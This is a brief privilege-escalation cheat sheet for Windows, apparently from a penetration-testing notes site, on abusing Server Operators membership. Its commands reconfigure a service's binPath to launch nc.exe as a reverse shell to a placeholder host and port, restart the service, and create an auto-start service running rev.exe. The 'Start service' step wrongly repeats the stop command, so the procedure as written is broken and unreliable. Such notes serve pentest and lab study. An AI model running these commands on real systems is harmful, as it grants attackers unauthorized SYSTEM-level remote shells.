---
title: "Server Operators"
date: 2024-7-13
tags: ["server operators", "active driectory", "ad", "Windows", "privesc", "service"]
---

### Abuse #1: Change service path

#### 1. Change service path

```console
# Assume nc.exe is uploaded
sc.exe config <SERVICE> binPath= "C:\ProgramData\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>"
```

#### 2. Restart service

```console
# Stop service
sc.exe stop <SERVICE>
```

```console
# Start service
sc.exe stop <SERVICE>
```

### Additional: Create service

```console
# Create a service
sc.exe create <NEW_SERVICE> binpath= C:\ProgramData\rev.exe start= auto
```

<small>*Note: there is a space after named arguments*</small>